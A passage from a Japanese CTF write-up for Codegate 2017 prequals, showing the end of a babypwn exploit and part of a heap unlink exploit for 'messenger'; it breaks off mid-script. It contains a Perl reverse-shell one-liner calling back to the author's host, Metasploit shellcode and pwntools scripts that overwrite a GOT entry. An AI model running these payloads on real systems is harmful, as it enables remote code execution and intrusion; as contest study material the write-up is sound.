<span id="cb6-64"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-64" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(addr_system_plt)     <span class="co"># system(addr_bss)</span></span>
<span id="cb6-65"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-65" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(socket_fd)</span>
<span id="cb6-66"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-66" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(addr_bss)</span>
<span id="cb6-67"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-67" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(<span class="bn">0x100</span>)</span>
<span id="cb6-68"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-68" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p32(<span class="dv">0</span>)</span>
<span id="cb6-69"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-69" aria-hidden="true" tabindex="-1"></a>echo(payload)</span>
<span id="cb6-70"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-70" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-71"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-71" aria-hidden="true" tabindex="-1"></a>exit_app()</span>
<span id="cb6-72"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-72" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb6-73"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-73" aria-hidden="true" tabindex="-1"></a><span class="co"># send connect-back shell one-liner</span></span>
<span id="cb6-74"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-74" aria-hidden="true" tabindex="-1"></a>r.clean()</span>
<span id="cb6-75"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb6-75" aria-hidden="true" tabindex="-1"></a>r.sendline(<span class="st">'perl -e </span><span class="ch">\'</span><span class="st">use Socket;$i=&quot;your.global.ip.address&quot;;$p=13895;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};</span><span class="ch">\'\x00</span><span class="st">'</span>)</span></code></pre></div>
<pre><code>$ nc -l -v 192.168.xxx.xxx 13895
Listening on [192.168.xxx.xxx] (family 0, port 13895)
Connection from 110.10.212.130 59276 received!
$ ls
babypwn
flag
$ cat flag
FLAG{Good_Job~!Y0u_@re_Very__G@@d!!!!!!^.^}
$ %                                            </code></pre>
<p>BabyPwn という名前の割にはおもしろい要素がたくさん詰め込まれている感じで, 解いててめちゃくちゃ楽しかった. 気づいたら50点にまで下がっててつらい…</p>
<h3 id="追記">2017/02/20 追記</h3>
<p>socket の fd が特定できているので, わざわざ connect-back shell を立ち上げなくとも <code>/bin/sh -i &lt;&amp;fd &gt;&amp;fd 2&gt;&amp;fd</code> を実行させればいいってことに気づいた. 上のスクリプトの最後の行を次のように変更することで, とりあえずローカルでシェルを取ることができた.</p>
<div class="sourceCode" id="cb8"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb8-1"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb8-1" aria-hidden="true" tabindex="-1"></a>r.sendline(<span class="st">'/bin/sh -i &lt;&amp;</span><span class="sc">{0}</span><span class="st"> &gt;&amp;</span><span class="sc">{0}</span><span class="st"> 2&gt;&amp;</span><span class="sc">{0}</span><span class="st">'</span>.<span class="bu">format</span>(socket_fd))</span>
<span id="cb8-2"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb8-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb8-3"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb8-3" aria-hidden="true" tabindex="-1"></a>r.interactive()</span></code></pre></div>
<pre><code>$ ./exploit2.py
[+] Opening connection to localhost on port 8181: Done
[*] leaked canary: 0x6e6b8100
[*] Switching to interactive mode
sh-4.4$ $ ls
ls
babypwn
exploit2.py
exploit.py
flag.txt
out
peda-session-babypwn.txt
sh-4.4$ $ 
[*] Closed connection to localhost port 8181</code></pre>
<h2 id="messenger-205pt">12 messenger <small>(205pt)</small></h2>
<p>x86-64 の ELF.</p>
<pre><code>$ file messenger
messenger: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=d8396b1a1f90c3679f6946c3693f93abf4563ba4, stripped

$ checksec messenger
[*] '/tmp/messenger'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      No PIE</code></pre>
<p>起動するとこんな感じ. 2つまでのメッセージの追加/削除/変更/確認ができる.</p>
<pre><code>$ ./messenger
 _ __ ___   ___  ___ ___  ___ _ __   __ _  ___ _ __
| '_ ` _ \ / _ \/ __/ __|/ _ \ '_ \ / _` |/ _ \ '__|
| | | | | |  __/\__ \__ \  __/ | | | (_| |  __/ |
|_| |_| |_|\___||___/___/\___|_| |_|\__, |\___|_|
                                    |___/
[L]eave message
[R]emove message
[C]hange message
[V]iew message
[Q]uit
&gt;&gt; </code></pre>
<p>先に書いておくと, この問題は <a href="https://github.com/ctfs/write-ups-2014/blob/master/plaid-ctf-2014/ezhp/README.md">Plaid CTF 2014: ezhp</a> に非常に似ていて, <a href="https://gist.github.com/Tosainu/1216f3b74aeff490fef0d0e3e3033671">実際に僕が解いたときのスクリプト</a>をこのプログラムに合わせて変更するだけで解くことができた.</p>
<p>このプログラムは <code>[L]eave message</code> で登録するメッセージの長さを <code>0x20</code> 文字までに制限しているのに対し, <code>[C]hange message</code> では長さのチェックを行なっておらず, しかも変更前の領域にそのまま新しいメッセージを書き込んでいる. メッセージは独自実装の <code>malloc()</code> 的なもので確保された heap 上にあるため, heap buffer overflow が起こせる.</p>
<p>そこで, 次のような攻撃を行う.<br />
メッセージを1つ追加したとき, heap はこのような双方向リストになっている. ここで一つのブロックのことを chunk, 前の chunk を指すポインタを <code>bk</code>, 次の chunk を指すポインタを <code>fd</code> と呼ぶことにする.</p>
<figure>
<img src="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/heap1.svg" alt="heap1" />
<figcaption aria-hidden="true">heap1</figcaption>
</figure>
<p>ここで1つ目のメッセージを変更して heap bof を起こし, 次の chunk の bk を <code>exit()</code> の GOT のアドレスから8を引いたものに書き換える.</p>
<figure>
<img src="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/heap2.svg" alt="heap2" />
<figcaption aria-hidden="true">heap2</figcaption>
</figure>
<p>この状態で2つ目のメッセージの追加するとこのようになり,</p>
<figure>
<img src="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/heap3.svg" alt="heap3" />
<figcaption aria-hidden="true">heap3</figcaption>
</figure>
<p>そのまま2つ目のメッセージの削除を行うと, <code>exit()</code> の GOT のアドレスから8を引いたもの以降を1つの chunk として見た時に <code>fd</code> に相当する <code>exit()</code> の GOT を3つ目の chunk のアドレスに書き換えることができる. (図の chunk1, chunk2 の <code>fd</code>, <code>bk</code> が指す要素は, 一応 gdb でも確認しているが正直自信がない. ここでは特に重要でないので気にしないで…)</p>
<figure>
<img src="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/heap4.svg" alt="heap4" />
<figcaption aria-hidden="true">heap4</figcaption>
</figure>
<p>あとは3つ目の chunk が作られる予定のアドレス辺りに shellcode が配置されるように1つ目のメッセージを再び変更する. すると <code>exit@plt()</code> が呼び出されたときに shellcode が実行されるようになる.</p>
<p>実際に作成したスクリプトと実行結果は次の通り.</p>
<div class="sourceCode" id="cb12"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb12-1"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-1" aria-hidden="true" tabindex="-1"></a><span class="co">#!/usr/bin/env python2</span></span>
<span id="cb12-2"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-2" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-3"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-3" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
<span id="cb12-4"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-4" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-5"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-5" aria-hidden="true" tabindex="-1"></a><span class="co"># $ objdump -M intel -j .plt -d messenger</span></span>
<span id="cb12-6"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-6" aria-hidden="true" tabindex="-1"></a><span class="co"># ...</span></span>
<span id="cb12-7"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-7" aria-hidden="true" tabindex="-1"></a><span class="co"># 0000000000400780 &lt;exit@plt&gt;:</span></span>
<span id="cb12-8"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-8" aria-hidden="true" tabindex="-1"></a><span class="co">#   400780:	ff 25 ea 18 20 00    	jmp    QWORD PTR [rip+0x2018ea]        # 602070 &lt;exit@plt+0x2018f0&gt;</span></span>
<span id="cb12-9"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-9" aria-hidden="true" tabindex="-1"></a><span class="co">#   400786:	68 0b 00 00 00       	push   0xb</span></span>
<span id="cb12-10"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-10" aria-hidden="true" tabindex="-1"></a><span class="co">#   40078b:	e9 30 ff ff ff       	jmp    4006c0 &lt;puts@plt-0x10&gt;</span></span>
<span id="cb12-11"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-11" aria-hidden="true" tabindex="-1"></a><span class="co"># ...</span></span>
<span id="cb12-12"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-12" aria-hidden="true" tabindex="-1"></a>addr_exit_got <span class="op">=</span> <span class="bn">0x602070</span></span>
<span id="cb12-13"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-13" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-14"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-14" aria-hidden="true" tabindex="-1"></a><span class="co"># msf &gt; use payload/linux/x64/exec</span></span>
<span id="cb12-15"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-15" aria-hidden="true" tabindex="-1"></a><span class="co"># msf payload(exec) &gt; generate -b '\x00' -t python -o CMD=/bin/sh</span></span>
<span id="cb12-16"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-16" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">=</span>  <span class="st">''</span></span>
<span id="cb12-17"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-17" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\x48\x31\xc9\x48\x81\xe9\xfa\xff\xff\xff\x48\x8d\x05</span><span class="st">'</span></span>
<span id="cb12-18"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-18" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\xef\xff\xff\xff\x48\xbb\x80\x51\x84\x63\x84\x7a\x7b</span><span class="st">'</span></span>
<span id="cb12-19"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-19" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\x73\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4</span><span class="st">'</span></span>
<span id="cb12-20"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-20" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\xea\x6a\xdc\xfa\xcc\xc1\x54\x11\xe9\x3f\xab\x10\xec</span><span class="st">'</span></span>
<span id="cb12-21"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-21" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\x7a\x28\x3b\x09\xb6\xec\x4e\xe7\x7a\x7b\x3b\x09\xb7</span><span class="st">'</span></span>
<span id="cb12-22"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-22" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\xd6\x8b\x8c\x7a\x7b\x73\xaf\x33\xed\x0d\xab\x09\x13</span><span class="st">'</span></span>
<span id="cb12-23"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-23" aria-hidden="true" tabindex="-1"></a>shellcode <span class="op">+=</span> <span class="st">'</span><span class="ch">\x73\xd6\x06\xcc\xea\x62\x75\x7e\x73</span><span class="st">'</span></span>
<span id="cb12-24"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-24" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-25"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-25" aria-hidden="true" tabindex="-1"></a><span class="co"># r = process('./messenger-patched')</span></span>
<span id="cb12-26"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-26" aria-hidden="true" tabindex="-1"></a>r <span class="op">=</span> remote(<span class="st">'110.10.212.137'</span>,  <span class="dv">3333</span>)</span>
<span id="cb12-27"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-27" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-28"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-28" aria-hidden="true" tabindex="-1"></a><span class="co">#  _ __ ___   ___  ___ ___  ___ _ __   __ _  ___ _ __</span></span>
<span id="cb12-29"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-29" aria-hidden="true" tabindex="-1"></a><span class="co"># | '_ ` _ \ / _ \/ __/ __|/ _ \ '_ \ / _` |/ _ \ '__|</span></span>
<span id="cb12-30"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-30" aria-hidden="true" tabindex="-1"></a><span class="co"># | | | | | |  __/\__ \__ \  __/ | | | (_| |  __/ |</span></span>
<span id="cb12-31"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-31" aria-hidden="true" tabindex="-1"></a><span class="co"># |_| |_| |_|\___||___/___/\___|_| |_|\__, |\___|_|</span></span>
<span id="cb12-32"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-32" aria-hidden="true" tabindex="-1"></a><span class="co">#                                     |___/</span></span>
<span id="cb12-33"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-33" aria-hidden="true" tabindex="-1"></a><span class="co"># [L]eave message</span></span>
<span id="cb12-34"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-34" aria-hidden="true" tabindex="-1"></a><span class="co"># [R]emove message</span></span>
<span id="cb12-35"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-35" aria-hidden="true" tabindex="-1"></a><span class="co"># [C]hange message</span></span>
<span id="cb12-36"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-36" aria-hidden="true" tabindex="-1"></a><span class="co"># [V]iew message</span></span>
<span id="cb12-37"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-37" aria-hidden="true" tabindex="-1"></a><span class="co"># [Q]uit</span></span>
<span id="cb12-38"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-38" aria-hidden="true" tabindex="-1"></a><span class="co"># &gt;&gt;</span></span>
<span id="cb12-39"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-39" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-40"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-40" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> choose_action(c):</span>
<span id="cb12-41"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-41" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'[Q]uit</span><span class="ch">\n</span><span class="st">&gt;&gt; '</span>)</span>
<span id="cb12-42"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-42" aria-hidden="true" tabindex="-1"></a>    r.sendline(c)</span>
<span id="cb12-43"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-43" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-44"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-44" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> leave_message(n, s):</span>
<span id="cb12-45"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-45" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="st">'L'</span>)</span>
<span id="cb12-46"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-46" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'size : '</span>)</span>
<span id="cb12-47"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-47" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(n))</span>
<span id="cb12-48"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-48" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'msg : '</span>)</span>
<span id="cb12-49"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-49" aria-hidden="true" tabindex="-1"></a>    r.send(s)</span>
<span id="cb12-50"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-50" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-51"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-51" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> remove_message(i):</span>
<span id="cb12-52"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-52" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="st">'R'</span>)</span>
<span id="cb12-53"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-53" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'index : '</span>)</span>
<span id="cb12-54"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-54" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(i))</span>
<span id="cb12-55"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-55" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-56"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-56" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> change_message(i, n, s):</span>
<span id="cb12-57"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-57" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="st">'C'</span>)</span>
<span id="cb12-58"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-58" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'index : '</span>)</span>
<span id="cb12-59"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-59" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(i))</span>
<span id="cb12-60"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-60" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'size : '</span>)</span>
<span id="cb12-61"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-61" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(n))</span>
<span id="cb12-62"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-62" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'msg : '</span>)</span>
<span id="cb12-63"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-63" aria-hidden="true" tabindex="-1"></a>    r.send(s)</span>
<span id="cb12-64"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-64" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-65"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-65" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> view_message(i):</span>
<span id="cb12-66"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-66" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="st">'V'</span>)</span>
<span id="cb12-67"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-67" aria-hidden="true" tabindex="-1"></a>    r.recvuntil(<span class="st">'index : '</span>)</span>
<span id="cb12-68"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-68" aria-hidden="true" tabindex="-1"></a>    r.sendline(<span class="bu">str</span>(i))</span>
<span id="cb12-69"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-69" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> r.recvuntil(<span class="st">'</span><span class="ch">\n</span><span class="st">[L]eave'</span>)[:<span class="op">-</span><span class="bu">len</span>(<span class="st">'</span><span class="ch">\n</span><span class="st">[L]eave'</span>)]</span>
<span id="cb12-70"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-70" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-71"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-71" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> quit():</span>
<span id="cb12-72"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-72" aria-hidden="true" tabindex="-1"></a>    choose_action(<span class="st">'Q'</span>)</span>
<span id="cb12-73"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-73" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-74"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-74" aria-hidden="true" tabindex="-1"></a><span class="co"># add 1st message</span></span>
<span id="cb12-75"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-75" aria-hidden="true" tabindex="-1"></a>leave_message(<span class="dv">4</span>, <span class="st">'AAAA'</span>)</span>
<span id="cb12-76"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-76" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-77"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-77" aria-hidden="true" tabindex="-1"></a><span class="co"># gdb-peda$ x/50xg 0x603000 &lt;- heap base</span></span>
<span id="cb12-78"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-78" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603000:	0x0000000000000018	0x0000000000603018</span></span>
<span id="cb12-79"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-79" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603010:	0x0000000000000000	0x0000000000000031 &lt;- 1st chunk size</span></span>
<span id="cb12-80"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-80" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603020:	0x0000000000603048	0x0000000000603000 &lt;- fd, bk</span></span>
<span id="cb12-81"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-81" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603030:	0x0000000041414141	0x0000000000000000</span></span>
<span id="cb12-82"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-82" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603040:	0x0000000000000000	0x00000000000003d0 &lt;- 2nd chunk size</span></span>
<span id="cb12-83"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-83" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603050:	0x0000000000000000	0x0000000000603018 &lt;- fd, bk</span></span>
<span id="cb12-84"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-84" aria-hidden="true" tabindex="-1"></a><span class="co"># 0x603060:	0x0000000000000000	0x0000000000000000</span></span>
<span id="cb12-85"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-85" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-86"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-86" aria-hidden="true" tabindex="-1"></a><span class="co"># resize 1st message and overwite 2nd chunk's bk</span></span>
<span id="cb12-87"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-87" aria-hidden="true" tabindex="-1"></a>payload <span class="op">=</span> <span class="st">''</span></span>
<span id="cb12-88"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-88" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> <span class="st">'A'</span> <span class="op">*</span> <span class="bn">0x18</span></span>
<span id="cb12-89"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-89" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(<span class="bn">0x3d0</span>)               <span class="co"># size</span></span>
<span id="cb12-90"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-90" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(<span class="dv">0</span>)                   <span class="co"># fd</span></span>
<span id="cb12-91"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-91" aria-hidden="true" tabindex="-1"></a>payload <span class="op">+=</span> p64(addr_exit_got <span class="op">-</span> <span class="dv">8</span>)   <span class="co"># bk</span></span>
<span id="cb12-92"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-92" aria-hidden="true" tabindex="-1"></a>change_message(<span class="dv">0</span>, <span class="bu">len</span>(payload), payload)</span>
<span id="cb12-93"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-93" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-94"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-94" aria-hidden="true" tabindex="-1"></a><span class="co"># add 2nd message</span></span>
<span id="cb12-95"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-95" aria-hidden="true" tabindex="-1"></a>leave_message(<span class="dv">4</span>, <span class="st">'AAAA'</span>)</span>
<span id="cb12-96"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-96" aria-hidden="true" tabindex="-1"></a></span>
<span id="cb12-97"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-97" aria-hidden="true" tabindex="-1"></a><span class="co"># remove 2nd message</span></span>
<span id="cb12-98"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-98" aria-hidden="true" tabindex="-1"></a><span class="co"># now, addr_exit_got was overwitten to 3rd chunk's addr</span></span>
<span id="cb12-99"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-99" aria-hidden="true" tabindex="-1"></a>remove_message(<span class="dv">1</span>)</span>
<span id="cb12-100"><a href="https://blog.myon.info/entry/2017/02/11/codegate-2017-prequals-writeup/#cb12-100" aria-hidden="true" tabindex="-1"></a></span>
